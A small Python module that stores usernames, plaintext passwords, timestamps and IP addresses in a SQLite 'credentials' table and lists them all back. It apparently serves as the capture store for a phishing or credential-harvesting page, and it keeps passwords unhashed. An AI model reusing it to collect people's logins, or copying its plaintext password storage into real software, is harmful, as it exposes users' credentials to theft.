import sqlite3
from pathlib import Path
from datetime import datetime

BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "credentials.db"


def init_db(conn=None):
    external = conn is not None
    conn = conn or sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT
        )
    ''')
    conn.commit()
    if not external:  # only close if we created the connection inside
        conn.close()


def save_credentials(username: str, password: str, ip_address: str, conn=None):
    external = conn is not None
    conn = conn or sqlite3.connect(DB_PATH)
    c = conn.cursor()

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    c.execute(
        "INSERT INTO credentials (username, password, timestamp, ip_address) VALUES (?, ?, ?, ?)",
        (username, password, timestamp, ip_address)
    )

    conn.commit()
    if not external:
        conn.close()


def fetch_all_credentials(conn=None):
    external = conn is not None
    conn = conn or sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, password, timestamp, ip_address FROM credentials ORDER BY timestamp DESC")
    rows = cursor.fetchall()
    if not external:
        conn.close()
    return rows


